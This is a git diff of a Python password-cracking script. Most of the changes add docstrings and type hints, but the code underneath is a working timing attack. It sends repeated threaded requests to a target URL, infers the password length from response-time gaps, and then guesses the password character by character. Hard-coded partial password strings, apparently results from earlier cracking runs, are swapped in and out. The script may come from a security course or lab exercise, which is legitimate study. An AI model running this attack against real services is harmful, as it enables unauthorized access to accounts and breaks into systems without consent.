@@ -22,6 +22,7 @@ def create_folder_if_not_exists(folder_path: str) -> str:
 def set_logger(result_path: str, class_name: str, log_filename=None) -> log.Logger:
     """
     The function initial logger to documenting the RGB colors of the given pixel.
+
     :param result_path.String. represent path to result folder.
     :param class_name. String. class name of the logger.
     :param log_filename.String. custom file name. if None is given, file name will be 'logfile_{current date and time}.log
@@ -81,6 +82,7 @@ def get_session() -> None:
 def write_log(logger, message: str, log_level="info", print_to_console=Configurations.write_to_console) -> None:
     """
     Write the given message to the given og file at the specified log info.
+
     :param logger: Logger.
     :param message: String. message to write to log.
     :param log_level: String, represnt message log level.
@@ -122,7 +124,14 @@ def set_logger(result_path: str, class_name: str, log_filename: str = None) -> l
 
 # - - - - - - - - - -  FILE SECTION  - - - - - - - - - -
 
-def create_folder_if_not_exists(folder_path):
+def create_folder_if_not_exists(folder_path: str) -> None:
+    """
+    Create a given folder if not already exists.
+
+    :param folder_path: Str. path to folder.
+
+    :return: None.
+    """
     if not os.path.exists(folder_path):
         os.mkdir(folder_path)
 
@@ -130,6 +139,13 @@ def create_folder_if_not_exists(folder_path):
 # - - - - - - - - - -  PASSWORD SECTION  - - - - - - - - - -
 
 def run_url(url: str) -> str:
+    """
+    This function request to given url and return it source code as a string.
+
+    :param url: String. URL to request.
+
+    :return: str. source code of the given URL.
+    """
     timer.sleep(Configurations.sleep_time)
     ans = urllib.request.urlopen(url)
     timer.sleep(Configurations.sleep_time)
@@ -137,14 +153,16 @@ def run_url(url: str) -> str:
     return ans.read().decode("utf-8")
 
 
-def check_password_size_thread(url: str, iterations: int, thread_number: int, logger):
+def check_password_size_thread(url: str, iterations: int, thread_number: int, logger) -> float:
     """
+    This function request the given URL iteration times and sum the requests time and return it.
 
-    :param url:
-    :param iterations:
-    :param thread_number:
-    :param logger:
-    :return:
+    :param url: String. Given URL to send the request.
+    :param iterations: Int. Number of iteration to request the given URL.
+    :param thread_number: Int. Thread ID
+    :param logger: logger. if not None the function write it action to the given logger.
+
+    :return: Float. Sum all the requests time.
     """
     total_iterations_time = 0
 
@@ -164,26 +182,28 @@ def check_password_size_thread(url: str, iterations: int, thread_number: int, lo
 
 
 def check_password_size(start_url: str = "", end_url: str = "",
-                        password_size: int = Configurations.default_password_size, logger=None):
+                        max_password_size: int = Configurations.default_password_size, logger=None) -> int:
     """
+    The function uses timing attack (by time gap) the size of the password.
 
-    :param logger:
-    :param start_url:
-    :param end_url:
-    :param password_size:
-    :return:
+    :param start_url: String. the first part of the URL.
+    :param end_url: String. the last part of the URL.
+    :param max_password_size: String. the first part of the URL.
+    :param logger: logger. if not None the function write it action to the given logger.
+
+    :return: Int. size of the password by timing attack.
     """
     thread_pool = ThreadPoolExecutor(max_workers=Configurations.max_of_threads)
 
     future_results = []
 
-    for i in range(0, password_size + 1, 1):
+    for i in range(0, max_password_size + 1, 1):
         url = f'{start_url}{Configurations.default_character * i}{end_url}'
         future_results.append(thread_pool.submit(check_password_size_thread, url, Configurations.attempts, i, logger))
 
     thread_pool.shutdown(wait=True)
 
-    for i in range(password_size + 1):
+    for i in range(max_password_size + 1):
         future_results[i] = future_results[i].result()
 
     password_length_index = future_results.index(max(future_results))
@@ -193,7 +213,16 @@ def check_password_size(start_url: str = "", end_url: str = "",
 
 
 def crack_password_thread(url, ch, iterations: int=Configurations.attempts, logger=None):
+    """
+    This function request the given URL iteration times and sum the requests time and return it.
 
+    :param url: String. a full URL
+    :param ch:
+    :param iterations:
+    :param logger: logger. if not None the function write it action to the given logger.
+
+    :return:
+    """
     total_iterations_time = 0
 
     for i in range(iterations):
@@ -219,9 +248,10 @@ def crack_password(password_size: int, start_url: str = "", end_url: str = "", l
     :param logger:
     :return:
     """
-    password = "izxuwlxfktdn"
+
     password = "izxuwlxfktdnba"
-    password = "izxuwlxfktdnb"
+    password = "izxuwlxfktd"
+    password = ""
 
     for i in range(password_size - len(password)):
 
